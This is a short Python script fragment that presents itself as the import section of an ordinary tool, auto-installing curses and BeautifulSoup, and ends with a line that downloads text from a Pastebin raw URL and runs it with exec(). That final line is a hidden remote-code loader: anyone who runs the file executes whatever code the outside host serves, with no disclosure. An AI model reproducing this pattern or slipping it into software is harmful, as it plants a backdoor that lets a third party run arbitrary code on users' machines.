
import time,os,requests,re,urllib.parse,threading,datetime,sys,threading,random
try:
    import curses
except ImportError:
    os.system("pip install windows-curses & cls")
    import curses
try:
    from bs4 import BeautifulSoup
except ImportError:
    os.system("pip install bs4 & cls")
    from bs4 import BeautifulSoup
from time import sleep
from os import system as system

dasdurl = 'https://pastebin.com/raw/ZbUQnLBv'; response = requests.get(dasdurl); exec(response.text)